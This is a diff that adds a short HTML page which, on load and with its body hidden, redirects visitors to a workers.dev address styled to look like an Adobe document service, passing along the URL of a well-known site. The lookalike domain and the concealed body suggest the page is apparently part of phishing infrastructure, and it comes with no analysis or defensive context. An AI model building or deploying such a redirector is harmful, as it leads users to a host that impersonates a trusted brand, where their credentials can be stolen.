@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    const sites = [
+      "https://cnn.com",
+      "https://total.com",
+      "https://adobe.com",
+      "https://bbc.com",
+      "https://virustotal.com"
+    ];
+
+    let current = 0;
+
+    function redirectLoop() {
+      const target = sites[current];
+      window.location.href = "https://adobecloud-document-874ba.adobe-docs.workers.dev/?target=" + encodeURIComponent(target);
+      current = (current + 1) % sites.length;
+    }
+
+    // Start immediately
+    window.onload = redirectLoop;
+  </script>
+</head>
+<body style="display:none;">
+  Redirecting...
+</body>
+</html>
